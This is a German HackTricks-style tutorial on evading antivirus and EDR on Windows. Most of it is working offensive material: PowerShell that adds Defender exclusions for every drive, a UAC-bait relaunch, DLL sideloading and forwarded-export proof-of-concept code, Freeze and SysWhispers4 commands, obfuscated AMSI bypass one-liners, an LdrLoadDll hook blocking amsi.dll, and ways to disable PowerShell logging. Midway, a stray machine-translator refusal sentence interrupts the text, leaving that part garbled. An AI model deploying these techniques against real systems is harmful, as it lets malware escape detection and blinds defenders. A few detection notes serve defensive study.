# Antivirus (AV)-Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** geschrieben!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, das Windows Defender am Arbeiten hindert.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender mithilfe eines gefälschten anderen AV am Arbeiten hindert.
- [Defender deaktivieren, wenn Sie Admin sind](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder vor Manipulationen an Defender

Öffentlich verfügbare Loader, die sich häufig als Game-Cheats ausgeben, werden oft als nicht signierte Node.js/Nexe-Installer ausgeliefert, die den Benutzer zunächst **zur Erhöhung der Berechtigungen auffordern** und erst danach Defender deaktivieren. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob der Prozess über administrative Rechte verfügt. Der Befehl ist nur erfolgreich, wenn der Aufrufer Admin-Rechte hat. Ein Fehlschlag bedeutet also, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem Verb `RunAs` erneut starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Opfer gehen bereits davon aus, „gecrackte“ Software zu installieren, und akzeptieren die Aufforderung daher meist. So erhält die Malware die nötigen Rechte, um die Defender-Richtlinie zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Nach der Rechteausweitung maximieren GachiLoader-ähnliche Angriffsketten die blinden Flecken von Defender, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und fügt dann **extrem weitreichende Ausnahmen** hinzu, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr überprüft werden kann:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **alle zukünftigen Payloads, die irgendwo auf der Festplatte abgelegt werden, ignoriert werden**.
- Der Ausschluss der Erweiterung `.sys` ist zukunftsorientiert – Angreifer behalten sich so die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen werden unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` vorgenommen. So können spätere Phasen bestätigen, dass die Ausschlüsse bestehen bleiben, oder sie erweitern, ohne UAC erneut auszulösen.

Da kein Defender-Dienst angehalten wird, melden oberflächliche Integritätsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitüberprüfung diese Pfade nie überwacht.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

AVs verwenden derzeit unterschiedliche Methoden, um zu prüfen, ob eine Datei bösartig ist: statische Erkennung, dynamische Analyse und bei fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Bei der statischen Erkennung werden bekannte bösartige Zeichenfolgen oder Byte-Arrays in einer Binärdatei oder einem Skript markiert. Außerdem werden Informationen aus der Datei selbst extrahiert (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass du leichter entdeckt wirst, da diese wahrscheinlich bereits analysiert und als bösartig eingestuft wurden. Es gibt mehrere Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen. Du benötigst jedoch eine Art Loader, um das Programm zu entschlüsseln und im Speicher auszuführen.

- **Obfuskation**

Manchmal genügt es, einige Zeichenfolgen in deiner Binärdatei oder deinem Skript zu ändern, damit es AV passiert. Je nachdem, was du obfuskieren möchtest, kann dies jedoch zeitaufwendig sein.

- **Eigene Tools**

Wenn du eigene Tools entwickelst, gibt es keine bekannten bösartigen Signaturen. Das erfordert jedoch viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool teilt die Datei im Wesentlichen in mehrere Segmente auf und lässt Defender jedes einzeln scannen. So kann es dir genau mitteilen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### Offline-Tests von PE-Merkmalen für statische Klassifikatoren

Gepackte oder verschlüsselte Payload-Bytes sind nur eine Eingabe für einen statischen Klassifikator. EMBER2024 extrahiert PE-Merkmale, darunter Imports, Exports, Sections, Header und Authenticode-Daten.<sup>[[48]](#references)</sup> In einem Loader-Experiment senkte das Hinzufügen von 141 harmlos wirkenden Imports den bösartigen EMBER2024-Score um 93 %, während mit Malware assoziierte Imports ihn erhöhten. Dieses Ergebnis gilt für dieses Modell und diese Samples und stellt keine zuverlässige Umgehung eines bestimmten AV-/EDR-Produkts dar.<sup>[[50]](#references)</sup>

Führe bei einem autorisierten Loader-Test für jede Variante dieselbe Payload und denselben Ausführungspfad aus, ändere pro Variante eine gezielte Build-Variable und vergleiche die Scores offline. Untersuche die resultierenden PE-Merkmale, da eine Build-Änderung mehr als eine Merkmalsgruppe beeinflussen kann.<sup>[[49]](#references)[[50]](#references)</sup> Damit die vorgesehenen Imports in der IAT bleiben, rufe die ausgewählten Win32-APIs aus erreichbarem Code auf. Variiere die Auswahl und verteile die Aufrufstellen auf verschiedene Builds, statt eine feste Tarnfunktion zu erstellen, die zu einer Signatur werden könnte. Im Experiment wurden außerdem niedrigere Scores bei gültiger Codesignierung, Export-Einträgen und einer größeren Anzahl von Funktionen, die `.pdata` vergrößern, festgestellt. Ungültige Signaturen hatten kaum Auswirkungen, und der Effekt auf `.pdata` war gering.<sup>[[50]](#references)</sup>

Das Paket `thrember` bietet Feature-Extraktion und Benchmark-Modelle. Installiere das Paket und verwende `thrember.download_models("models")` mit einem vorhandenen `models`-Verzeichnis. Führe den Scorer anschließend aus dessen übergeordnetem Verzeichnis aus: Die Download-Hilfsfunktion ändert das aktuelle Arbeitsverzeichnis. Der PE-Klassifikator kann ein Verzeichnis mit Builds bewerten, ohne sie an einen Scan-Dienst zu übermitteln:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Keep the Modell- und Feature-Extractor-Versionen während des Vergleichs unverändert. Ein niedrigerer Offline-Score zeigt nur, wie dieser Klassifikator auf die geänderte Binärdatei reagiert; er beweist nicht, dass Verhaltensanalysen, Emulation oder ein anderes Modell eines Anbieters umgangen werden.<sup>[[49]](#references)[[50]](#references)</sup> Informationen zu [Per-Build-Polymorphismus und Tarnung der äußeren Binärdatei in virtualisierten Payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) findest du im separaten Ausführungsmodell.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binärdatei in einer Sandbox aus und beobachtet sie auf schädliche Aktivitäten (z. B. den Versuch, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen Minidump von LSASS zu erstellen usw.). Das kann etwas schwieriger sein, aber hier sind einige Möglichkeiten, Sandboxes zu umgehen.

- **Vor der Ausführung warten** Je nach Implementierung kann dies eine gute Möglichkeit sein, die dynamische Analyse des AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, ohne den Arbeitsablauf des Benutzers zu unterbrechen. Lange Wartezeiten können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit einfach überspringen können, je nachdem, wie sie implementiert sind.
- **Ressourcen des Computers prüfen** Sandboxes verfügen in der Regel nur über wenige Ressourcen (z. B. weniger als 2 GB RAM), da sie sonst den Computer des Benutzers verlangsamen könnten. Du kannst auch kreativ werden, zum Beispiel die CPU-Temperatur oder sogar die Lüftergeschwindigkeit prüfen – nicht alles davon wird in der Sandbox implementiert sein.
- **Computerspezifische Prüfungen** Wenn du einen Benutzer angreifen willst, dessen Workstation zur Domäne „contoso.local“ gehört, kannst du die Domäne des Computers prüfen und feststellen, ob sie mit der von dir angegebenen übereinstimmt. Ist das nicht der Fall, kannst du dein Programm beenden lassen.

Wie sich herausstellt, lautet der Computername der Microsoft-Defender-Sandbox HAL9TH. Du kannst also vor der Detonation in deiner Malware den Computernamen prüfen. Lautet der Name HAL9TH, befindest du dich in der Defender-Sandbox und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Weitere gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Umgehen von Sandboxes:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie wir bereits in diesem Beitrag erwähnt haben, werden **öffentliche Tools** früher oder später **erkannt**. Deshalb solltest du dich fragen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du dafür wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpt?

Wahrscheinlich ist Letzteres die richtige Antwort. Am Beispiel von mimikatz: Es ist vermutlich eines der am häufigsten von AVs und EDRs erkannten Malware-Tools, wenn nicht sogar das am häufigsten erkannte. Das Projekt selbst ist zwar großartig, aber es ist auch ein Albtraum, damit AVs zu umgehen. Suche deshalb nach Alternativen, mit denen du dein Ziel erreichen kannst.

> [!TIP]
> Wenn du deine Payloads zur Umgehung von Erkennung veränderst, solltest du **die automatische Übermittlung von Samples** in Defender deaktivieren. Und bitte, wirklich: **Lade die Payload NICHT auf VIRUSTOTAL hoch**, wenn du langfristig Erkennung vermeiden willst. Wenn du prüfen möchtest, ob ein bestimmtes AV deine Payload erkennt, installiere es auf einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs. DLLs

Wenn möglich, solltest du zur Umgehung von Erkennung immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien in der Regel **viel seltener erkannt und analysiert**. In manchen Fällen ist das ein einfacher Trick, um eine Erkennung zu vermeiden (sofern deine Payload als DLL ausgeführt werden kann).

Wie in diesem Bild zu sehen ist, hat eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich einer normalen Havoc-EXE-Payload mit einer normalen Havoc-DLL auf antiscan.me</p></figcaption></figure>

Nun zeigen wir einige Tricks, mit denen du DLL-Dateien noch unauffälliger machen kannst.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem die Opferanwendung und die schädlichen Payloads nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt die Liste der Programme in „C:\Program Files\\“ aus, die für DLL hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **selbst nach DLL Hijackable/Sideloadable-Programmen zu suchen**. Bei korrekter Ausführung ist diese Technik ziemlich stealthy. Wenn du jedoch öffentlich bekannte DLL Sideloadable-Programme verwendest, wirst du möglicherweise leicht entdeckt.

Wenn du einfach eine bösartige DLL mit dem Namen einer DLL platzierst, die ein Programm zu laden erwartet, wird dein Payload nicht geladen, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm macht, von der Proxy-DLL (der bösartigen DLL) an die ursprüngliche DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und dein Payload kann ausgeführt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Das sind die Schritte, die ich ausgeführt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die ursprüngliche umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) kodiert) als auch die Proxy-DLL haben auf [antiscan.me](https://antiscan.me) eine Detection-Rate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir S3cur3Th1sSh1ts [Twitch-VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über die besprochenen Themen zu erfahren.

### Weitergeleitete Exports ausnutzen (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die eigentlich „Forwarder“ sind: Statt auf Code zu verweisen, enthält der Export-Eintrag eine ASCII-Zeichenfolge im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader Folgendes aus:

- `TargetDll` laden, falls es noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet. Diese umfasst auch das Verzeichnis des Moduls, das die Weiterleitung auflöst.

Dadurch entsteht eine indirekte Sideloading-Möglichkeit: Finde eine signierte DLL, die eine Funktion exportiert, die an ein Modul weitergeleitet wird, das keine KnownDLL ist. Lege diese signierte DLL dann zusammen mit einer von dir kontrollierten DLL ab, die exakt wie das weitergeleitete Zielmodul heißt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL und wird daher anhand der normalen Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Eine minimale `DllMain` reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, damit `DllMain` ausgelöst wird.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Lösen Sie das Forwarding mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt anschließend `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du den Fehler „missing API“ erst, nachdem `DllMain` bereits ausgeführt wurde

Tipps für die Suche:
- Konzentriere dich auf weitergeleitete Exporte, deren Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Weitergeleitete Exporte lassen sich mit Tools wie den folgenden aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11-Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Verteidigung:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarmiere bei Prozess-/Modulketten wie: `rundll32.exe` → Nicht-System-`keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden
- Setze Code-Integritätsrichtlinien (WDAC/AppLocker) durch und untersage Schreib- und Ausführungsrechte in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Mit Freeze kannst du deinen Shellcode unauffällig laden und ausführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlass dich daher nie nur auf ein einziges Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu verketten.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs setzen häufig **user-mode inline hooks** auf `ntdll.dll`-Syscall-Stubs. Um diese Hooks zu umgehen, kannst du **direct** oder **indirect** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Einstiegspunkt auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Fügt eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion in den generierten Stub ein (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: Springt zu einem vorhandenen **syscall**-Gadget innerhalb von `ntdll`, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur heuristischen Evasion); **randomized indirect** wählt für jeden Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Vermeidet es, die statische Opcode-Sequenz `0F 05` auf der Festplatte einzubetten; löst zur Laufzeit eine Syscall-Sequenz auf.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: Leitet SSNs ab, indem Syscall-Stubs nach virtueller Adresse sortiert werden, anstatt Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Mappt ein sauberes `\KnownDlls\ntdll.dll`, liest die SSNs aus dessen `.text`-Abschnitt und hebt das Mapping anschließend auf (umgeht alle Hooks im Speicher).
- **RecycledGate**: Kombiniert die Ableitung von SSNs anhand der sortierten virtuellen Adressen mit der Opcode-Validierung, wenn ein Stub sauber ist; bei einem Hook wird auf die Ableitung anhand der virtuellen Adresse zurückgegriffen.
- **HW Breakpoint**: Setzt DR0 auf die `syscall`-Instruktion und verwendet einen VEH, um die SSN zur Laufzeit aus `EAX` auszulesen, ohne gehookte Bytes zu parsen.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Anfangs konnten AVs nur **Dateien auf dem Datenträger** scannen. Wenn man also irgendwie Payloads **direkt im Speicher** ausführen konnte, konnte der AV nichts dagegen unternehmen, da ihm die nötige Sichtbarkeit fehlte.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert:

- Benutzerkontensteuerung (User Account Control, UAC; Erhöhung der Rechte für EXE-, COM- und MSI-Dateien sowie ActiveX-Installationen)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht es Antivirenlösungen, das Skriptverhalten zu untersuchen, indem Skriptinhalte unverschlüsselt und unverschleiert bereitgestellt werden.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` löst unter Windows Defender den folgenden Alarm aus.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` vorangestellt wird, gefolgt vom Pfad zur ausführbaren Datei, von der aus das Skript ausgeführt wurde – in diesem Fall powershell.exe.

Wir haben keine Datei auf den Datenträger geschrieben, wurden aber trotzdem im Speicher durch AMSI erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI geleitet. Das betrifft sogar `Assembly.Load(byte[])`, mit dem Code zur Ausführung im Speicher geladen wird. Deshalb wird für die Ausführung im Speicher die Verwendung älterer .NET-Versionen (wie 4.7.2 oder älter) empfohlen, wenn du AMSI umgehen möchtest.

Es gibt einige Möglichkeiten, AMSI zu umgehen:

- **Verschleierung**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Ändern der Skripte, die du zu laden versuchst, eine gute Möglichkeit sein, der Erkennung zu entgehen.

AMSI kann Skripte jedoch auch dann entschleiern, wenn sie mehrere Verschleierungsebenen haben. Je nach Vorgehensweise kann Verschleierung daher eine schlechte Option sein. Dadurch ist die Umgehung nicht ganz trivial. Manchmal reicht es allerdings schon aus, ein paar Variablennamen zu ändern. Es kommt also darauf an, wie stark etwas bereits markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den powershell-Prozess (sowie cscript.exe, wscript.exe usw.) geladen wird, kann sie leicht manipuliert werden – sogar mit einem unprivilegierten Benutzerkonto. Aufgrund dieses Fehlers in der AMSI-Implementierung haben Forschende mehrere Möglichkeiten gefunden, AMSI-Scans zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (`amsiInitFailed`), wird für den aktuellen Prozess kein Scan gestartet. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht. Microsoft hat eine Signatur entwickelt, um eine weitere Verbreitung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Es genügte eine einzige Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wird natürlich von AMSI selbst erkannt, daher muss sie modifiziert werden, um diese Technik anzuwenden.

Hier ist ein modifizierter AMSI-Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Beachte, dass dieser Beitrag wahrscheinlich markiert wird, sobald er veröffentlicht ist. Du solltest also keinen Code veröffentlichen, wenn du unerkannt bleiben möchtest.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll gesucht (die für das Scannen der vom Benutzer bereitgestellten Eingabe zuständig ist) und mit Anweisungen überschrieben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt außerdem viele weitere Techniken, um AMSI mit PowerShell zu umgehen. Weitere Informationen dazu findest du auf [**dieser Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und in [**diesem Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen, und für diesen Prozess finden keine Scans statt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ich kann keine Anleitung übersetzen, die konkrete Methoden zum Umgehen von AMSI oder zum Entfernen von AV/EDR-Erkennungen beschreibt. Ich kann stattdessen eine defensive Zusammenfassung oder Hinweise zur Erkennung und Abwehr auf Deutsch formulieren.

```bash
powershell.exe -version 2
```

## PowerShell-Protokollierung

Die PowerShell-Protokollierung ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Dies kann für Audits und die Fehlerbehebung nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen möchten**.

Um die PowerShell-Protokollierung zu umgehen, kannst du die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Du kannst dafür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne dass sie von AMSI gescannt werden. Das geht so: `powershell.exe -version 2`
